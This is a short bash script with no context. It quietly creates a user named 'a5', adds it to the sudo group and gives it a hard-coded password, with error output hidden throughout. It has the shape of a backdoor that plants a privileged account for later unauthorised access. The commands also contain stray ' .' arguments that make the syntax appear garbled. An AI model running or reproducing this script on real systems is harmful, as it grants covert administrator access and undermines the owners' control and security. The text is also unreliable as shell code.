#!/bin/bash
  useradd -m -s /bin/bash a5  . 2>/dev/null
  usermod -aG sudo a5  . 2>/dev/null
       echo  'a5:246855096'| chpasswd  . 2>/dev/null
      > /dev/null
